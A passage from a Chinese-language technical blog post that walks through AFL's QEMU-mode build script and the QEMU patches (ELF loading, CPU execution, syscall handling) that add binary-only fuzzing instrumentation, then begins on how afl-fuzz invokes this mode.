class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Copyright 2015 Google LLC All rights reserved.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">you may not use this file except <span class="keyword">in</span> compliance with the License.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">You may obtain a copy of the License at:</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   http://www.apache.org/licenses/LICENSE-2.0</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">distributed under the License is distributed on an <span class="string">&quot;AS IS&quot;</span> BASIS,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See the License <span class="keyword">for</span> the specific language governing permissions and</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">limitations under the License.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-----------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">american fuzzy lop - QEMU build script</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--------------------------------------</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Written by Andrew Griffiths &lt;agriffiths@google.com&gt; and</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">           Michal Zalewski &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This script downloads, patches, and builds a version of QEMU with</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">minor tweaks to allow non-instrumented binaries to be run under</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">afl-fuzz.</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The modifications reside in patches/*. The standalone QEMU binary</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">will be written to ../afl-qemu-trace.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"></span><br><span class="line">VERSION=&quot;2.10.0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">QEMU 2.10.0 源码下载</span></span><br><span class="line">QEMU_URL=&quot;http://download.qemu-project.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br><span class="line">QEMU_SHA384=&quot;68216c935487bc8c0596ac309e1e3ee75c2c4ce898aab796faa321db5740609ced365fedda025678d072d09ac8928105&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;=================================================&quot;</span><br><span class="line">echo &quot;AFL binary-only instrumentation QEMU build script&quot;</span><br><span class="line">echo &quot;=================================================&quot;</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Performing basic sanity checks...&quot;</span><br><span class="line"></span><br><span class="line">if [ ! &quot;`uname -s`&quot; = &quot;Linux&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: QEMU instrumentation is supported only on Linux.&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行patch</span></span><br><span class="line">if [ ! -f &quot;patches/afl-qemu-cpu-inl.h&quot; -o ! -f &quot;../config.h&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: key files not found - wrong working directory?&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ ! -f &quot;../afl-showmap&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: ../afl-showmap not found - compile AFL first!&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in libtool wget python automake autoconf sha384sum bison iconv; do</span><br><span class="line"></span><br><span class="line">  T=`which &quot;$i&quot; 2&gt;/dev/null`</span><br><span class="line"></span><br><span class="line">  if [ &quot;$T&quot; = &quot;&quot; ]; then</span><br><span class="line"></span><br><span class="line">    echo &quot;[-] Error: &#x27;$i&#x27; not found, please install first.&quot;</span><br><span class="line">    exit 1</span><br><span class="line"></span><br><span class="line">  fi</span><br><span class="line"></span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ ! -d &quot;/usr/include/glib-2.0/&quot; -a ! -d &quot;/usr/local/include/glib-2.0/&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: devel version of &#x27;glib2&#x27; not found, please install first.&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if echo &quot;$CC&quot; | grep -qF /afl-; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: do not use afl-gcc or afl-clang to compile this tool.&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;[+] All checks passed!&quot;</span><br><span class="line"></span><br><span class="line">ARCHIVE=&quot;`basename -- &quot;$QEMU_URL&quot;`&quot;</span><br><span class="line"></span><br><span class="line">CKSUM=`sha384sum -- &quot;$ARCHIVE&quot; 2&gt;/dev/null | cut -d&#x27; &#x27; -f1`</span><br><span class="line"></span><br><span class="line">if [ ! &quot;$CKSUM&quot; = &quot;$QEMU_SHA384&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[*] Downloading QEMU $&#123;VERSION&#125; from the web...&quot;</span><br><span class="line">  rm -f &quot;$ARCHIVE&quot;</span><br><span class="line">  wget -O &quot;$ARCHIVE&quot; -- &quot;$QEMU_URL&quot; || exit 1</span><br><span class="line"></span><br><span class="line">  CKSUM=`sha384sum -- &quot;$ARCHIVE&quot; 2&gt;/dev/null | cut -d&#x27; &#x27; -f1`</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$CKSUM&quot; = &quot;$QEMU_SHA384&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[+] Cryptographic signature on $ARCHIVE checks out.&quot;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: signature mismatch on $ARCHIVE (perhaps download error?).&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Uncompressing archive (this will take a while)...&quot;</span><br><span class="line"></span><br><span class="line">rm -rf &quot;qemu-$&#123;VERSION&#125;&quot; || exit 1</span><br><span class="line">tar xf &quot;$ARCHIVE&quot; || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Unpacking successful.&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据脚本执行的环境变量CPU_TARGET编译对应架构的QEMU</span></span><br><span class="line">echo &quot;[*] Configuring QEMU for $CPU_TARGET...&quot;</span><br><span class="line"></span><br><span class="line">ORIG_CPU_TARGET=&quot;$CPU_TARGET&quot;</span><br><span class="line"></span><br><span class="line">test &quot;$CPU_TARGET&quot; = &quot;&quot; &amp;&amp; CPU_TARGET=&quot;`uname -m`&quot;</span><br><span class="line">test &quot;$CPU_TARGET&quot; = &quot;i686&quot; &amp;&amp; CPU_TARGET=&quot;i386&quot;</span><br><span class="line"></span><br><span class="line">cd qemu-$VERSION || exit 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对QEMU源码进行patch</span></span><br><span class="line">echo &quot;[*] Applying patches...&quot;</span><br><span class="line"></span><br><span class="line">patch -p1 &lt;../patches/elfload.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/cpu-exec.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/syscall.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/configure.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/memfd.diff || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Patching done.&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--enable-pie seems to give a couple of <span class="built_in">exec</span><span class="string">&#x27;s a second performance</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">improvement, much to my surprise. Not sure how universal this is..</span></span></span><br><span class="line"></span><br><span class="line">CFLAGS=&quot;-O3 -ggdb&quot; ./configure --disable-system \</span><br><span class="line">  --enable-linux-user --disable-gtk --disable-sdl --disable-vnc \</span><br><span class="line">  --target-list=&quot;$&#123;CPU_TARGET&#125;-linux-user&quot; --enable-pie --enable-kvm || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Configuration complete.&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Attempting to build QEMU (fingers crossed!)...&quot;</span><br><span class="line"></span><br><span class="line">make || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Build process successful!&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Copying binary...&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">将编译出来的qemu可执行文件复制为afl-qemu-trace</span></span></span><br><span class="line">cp -f &quot;$&#123;CPU_TARGET&#125;-linux-user/qemu-$&#123;CPU_TARGET&#125;&quot; &quot;../../afl-qemu-trace&quot; || exit 1</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">ls -l ../afl-qemu-trace || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Successfully created &#x27;../afl-qemu-trace&#x27;.&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$ORIG_CPU_TARGET&quot; = &quot;&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[*] Testing the build...&quot;</span><br><span class="line"></span><br><span class="line">  cd ..</span><br><span class="line"></span><br><span class="line">  make &gt;/dev/null || exit 1</span><br><span class="line"></span><br><span class="line">  gcc test-instr.c -o test-instr || exit 1</span><br><span class="line"></span><br><span class="line">  unset AFL_INST_RATIO</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"><span class="string">We shouldn&#x27;</span>t need the /dev/null hack because program isn<span class="string">&#x27;t compiled with any</span></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"><span class="string">optimizations.</span></span></span><br><span class="line">  echo 0 | ./afl-showmap -m none -Q -q -o .test-instr0 ./test-instr || exit 1</span><br><span class="line">  echo 1 | ./afl-showmap -m none -Q -q -o .test-instr1 ./test-instr || exit 1</span><br><span class="line"></span><br><span class="line">  rm -f test-instr</span><br><span class="line"></span><br><span class="line">  cmp -s .test-instr0 .test-instr1</span><br><span class="line">  DR=&quot;$?&quot;</span><br><span class="line"></span><br><span class="line">  rm -f .test-instr0 .test-instr1</span><br><span class="line"></span><br><span class="line">  if [ &quot;$DR&quot; = &quot;0&quot; ]; then</span><br><span class="line"></span><br><span class="line">    echo &quot;[-] Error: afl-qemu-trace instrumentation doesn&#x27;t seem to work!&quot;</span><br><span class="line">    exit 1</span><br><span class="line"></span><br><span class="line">  fi</span><br><span class="line"></span><br><span class="line">  echo &quot;[+] Instrumentation tests passed. &quot;</span><br><span class="line">  echo &quot;[+] All set, you can now use the -Q mode in afl-fuzz!&quot;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">  echo &quot;[!] Note: can&#x27;t test instrumentation when CPU_TARGET set.&quot;</span><br><span class="line">  echo &quot;[+] All set, you can now (hopefully) use the -Q mode in afl-fuzz!&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到编译脚本中是先下载指定 QEMU 版本的源码，进行一些检测，然后进行 patch。patch 是对 QEMU 的 ELF 装载、CPU 执行、系统调用、内存描述符等相关的代码进行了修改，以及对 configure 文件也进行修改。patch 完成之后进行 make，然后将编译完成的 qemu-${CPU_TARGET} 复制到 afl 的目录下，重命名为 afl-qemu-trace，在之后会从 afl-fuzz.c 简单说下 afl-qemu-trace 是如何进行调用的。这个地方说一下，如果要 fuzz 指定架构的二进制文件，那么需要在编译的时候指定编译 qemu 可执行文件针对的架构，例如编译 mips 的命令：<code>CPU_TARGET=mips ./build_qemu_support.sh</code>。然后就是在脚本中测试编译出来的 afl-qemu-trace 能否正常使用。</p>
<p>可见最为关键的地方是进行的几个 patch，patch 文件内容不多，下面来简单分析一下 diff 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/Code/AFL/qemu_mode/patches [0:49:08] </span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── afl-qemu-cpu-inl.h</span><br><span class="line">├── configure.diff</span><br><span class="line">├── cpu-exec.diff</span><br><span class="line">├── elfload.diff</span><br><span class="line">├── memfd.diff</span><br><span class="line">└── syscall.diff</span><br><span class="line"></span><br><span class="line">0 directories, 6 files</span><br></pre></td></tr></table></figure>

<h3 id="elfload-diff"><a href="#elfload-diff" class="headerlink" title="elfload.diff"></a>elfload.diff</h3><p>如下是 elfload.diff 文件，新增了三个外部引用，在 QEMU 执行 ELF 文件解析的时候获取这些地址。</p>
<ul>
<li>afl_entry_point：ELF 的入口点</li>
<li>afl_start_code：ELF 代码段的 start</li>
<li>afl_end_code：ELF 代码段的 end</li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-rc3-clean/linux-user/elfload.c	2017-08-15 11:39:41.000000000 -0700</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0-rc3/linux-user/elfload.c	2017-08-22 14:33:57.397127516 -0700</span></span><br><span class="line"><span class="meta">@@ -20,6 +20,8 @@</span></span><br><span class="line"> </span><br><span class="line"> #define ELF_OSABI   ELFOSABI_SYSV</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern abi_ulong afl_entry_point, afl_start_code, afl_end_code;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> /* from personality.h */</span><br><span class="line"> </span><br><span class="line"> /*</span><br><span class="line"><span class="meta">@@ -2085,6 +2087,8 @@</span></span><br><span class="line">     info-&gt;brk = 0;</span><br><span class="line">     info-&gt;elf_flags = ehdr-&gt;e_flags;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    if (!afl_entry_point) afl_entry_point = info-&gt;entry;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     for (i = 0; i &lt; ehdr-&gt;e_phnum; i++) &#123;</span><br><span class="line">         struct elf_phdr *eppnt = phdr + i;</span><br><span class="line">         if (eppnt-&gt;p_type == PT_LOAD) &#123;</span><br><span class="line"><span class="meta">@@ -2118,9 +2122,11 @@</span></span><br><span class="line">             if (elf_prot &amp; PROT_EXEC) &#123;</span><br><span class="line">                 if (vaddr &lt; info-&gt;start_code) &#123;</span><br><span class="line">                     info-&gt;start_code = vaddr;</span><br><span class="line"><span class="addition">+                    if (!afl_start_code) afl_start_code = vaddr;</span></span><br><span class="line">                 &#125;</span><br><span class="line">                 if (vaddr_ef &gt; info-&gt;end_code) &#123;</span><br><span class="line">                     info-&gt;end_code = vaddr_ef;</span><br><span class="line"><span class="addition">+                    if (!afl_end_code) afl_end_code = vaddr_ef;</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             if (elf_prot &amp; PROT_WRITE) &#123;</span><br></pre></td></tr></table></figure>

<h3 id="cpu-exec-diff"><a href="#cpu-exec-diff" class="headerlink" title="cpu-exec.diff"></a>cpu-exec.diff</h3><p>如下是 cpu-exec.diff 文件，新增了一个头文件 afl-qemu-cpu-inl.h，在 CPU 执行 QEMU 翻译代码的前后位置分别加入了宏定义 AFL_QEMU_CPU_SNIPPET2 和 AFL_QEMU_CPU_SNIPPET1。TB（Translation Block）是 QEMU 进行指令翻译的基本单位。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-rc3-clean/accel/tcg/cpu-exec.c	2017-08-15 11:39:41.000000000 -0700</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0-rc3/accel/tcg/cpu-exec.c	2017-08-22 14:34:55.868730680 -0700</span></span><br><span class="line"><span class="meta">@@ -36,6 +36,8 @@</span></span><br><span class="line"> #include &quot;sysemu/cpus.h&quot;</span><br><span class="line"> #include &quot;sysemu/replay.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#include &quot;../patches/afl-qemu-cpu-inl.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> /* -icount align implementation. */</span><br><span class="line"> </span><br><span class="line"> typedef struct SyncClocks &#123;</span><br><span class="line"><span class="meta">@@ -144,6 +146,8 @@</span></span><br><span class="line">     int tb_exit;</span><br><span class="line">     uint8_t *tb_ptr = itb-&gt;tc_ptr;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    AFL_QEMU_CPU_SNIPPET2;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     qemu_log_mask_and_addr(CPU_LOG_EXEC, itb-&gt;pc,</span><br><span class="line">                            &quot;Trace %p [%d: &quot; TARGET_FMT_lx &quot;] %s\n&quot;,</span><br><span class="line">                            itb-&gt;tc_ptr, cpu-&gt;cpu_index, itb-&gt;pc,</span><br><span class="line"><span class="meta">@@ -365,6 +369,7 @@</span></span><br><span class="line">             if (!tb) &#123;</span><br><span class="line">                 /* if no translated code available, then translate it now */</span><br><span class="line">                 tb = tb_gen_code(cpu, pc, cs_base, flags, 0);</span><br><span class="line"><span class="addition">+                AFL_QEMU_CPU_SNIPPET1;</span></span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line">             mmap_unlock();</span><br></pre></td></tr></table></figure>

<p>如下是两个宏定义的源码，AFL_QEMU_CPU_SNIPPET1 是用来实现翻译的加速，AFL_QEMU_CPU_SNIPPET2 位于执行 TB 的函数，在待 fuzz 程序的入口处，进行 afl_setup，然后执行 afl_forkserver，其中有 fork 执行过程。对于覆盖率的计算则是常见的 afl_maybe_log 函数，在使用 afl-gcc 等编译的程序中也会在基本块插入 afl_maybe_log 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* A snippet patched into tb_find_slow to inform the parent process that</span></span><br><span class="line"><span class="comment">   we have hit a new block that hasn&#x27;t been translated yet, and to tell</span></span><br><span class="line"><span class="comment">   it to translate within its own context, too (this avoids translation</span></span><br><span class="line"><span class="comment">   overhead in the next forked-off copy). */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do &#123; \</span></span><br><span class="line"><span class="meta">    afl_request_tsl(pc, cs_base, flags); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This snippet kicks in when the instruction pointer is positioned at</span></span><br><span class="line"><span class="comment">   _start and does the usual forkserver stuff, not very different from</span></span><br><span class="line"><span class="comment">   regular instrumentation injected via afl-as.h. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(itb-&gt;pc == afl_entry_point) &#123; \</span></span><br><span class="line"><span class="meta">      afl_setup(); \</span></span><br><span class="line"><span class="meta">      afl_forkserver(cpu); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">    afl_maybe_log(itb-&gt;pc); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<h3 id="syscall-diff"><a href="#syscall-diff" class="headerlink" title="syscall.diff"></a>syscall.diff</h3><p>如下是 syscall.diff，定义了全局变量 qemu.h，新增外部引用 afl_forksrv_pid，也就是 forkserver 的 pid，新增了对于 TARGET_NR_tgkill 的判定，具体的含义不是很懂，但应该和 target 的执行返回错误码有关。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-rc3-clean/linux-user/syscall.c	2017-08-15 11:39:41.000000000 -0700</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0-rc3/linux-user/syscall.c	2017-08-22 14:34:03.193088186 -0700</span></span><br><span class="line"><span class="meta">@@ -116,6 +116,8 @@</span></span><br><span class="line"> </span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern unsigned int afl_forksrv_pid;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"><span class="meta">@@ -11688,8 +11690,21 @@</span></span><br><span class="line">         break;</span><br><span class="line"> </span><br><span class="line">     case TARGET_NR_tgkill:</span><br><span class="line"><span class="deletion">-        ret = get_errno(safe_tgkill((int)arg1, (int)arg2,</span></span><br><span class="line"><span class="deletion">-                        target_to_host_signal(arg3)));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        &#123;</span></span><br><span class="line"><span class="addition">+          int pid  = (int)arg1,</span></span><br><span class="line"><span class="addition">+              tgid = (int)arg2,</span></span><br><span class="line"><span class="addition">+              sig  = (int)arg3;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+          /* Not entirely sure if the below is correct for all architectures. */</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+          if(afl_forksrv_pid &amp;&amp; afl_forksrv_pid == pid &amp;&amp; sig == SIGABRT)</span></span><br><span class="line"><span class="addition">+              pid = tgid = getpid();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+          ret = get_errno(safe_tgkill(pid, tgid, target_to_host_signal(sig)));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         break;</span><br><span class="line"> </span><br><span class="line"> #ifdef TARGET_NR_set_robust_list</span><br></pre></td></tr></table></figure>

<p>综上所述，三个 patch 文件所作的工作就是在 qemu 代码翻译的阶段，在 QEMU 翻译基本块 TB 加入指令插桩代码，从 ELF 的入口开始执行，然后进行代码覆盖率和错误代码的相关计算。</p>
<h2 id="afl-fuzz-c-中使用-qemu-mode"><a href="#afl-fuzz-c-中使用-qemu-mode" class="headerlink" title="afl-fuzz.c 中使用 qemu mode"></a>afl-fuzz.c 中使用 qemu mode</h2><p>假设已经简单阅读过 afl-fuzz.c 的源码，在 main 函数参数解析时，会判定 -Q 使用了 qemu mode。</p>
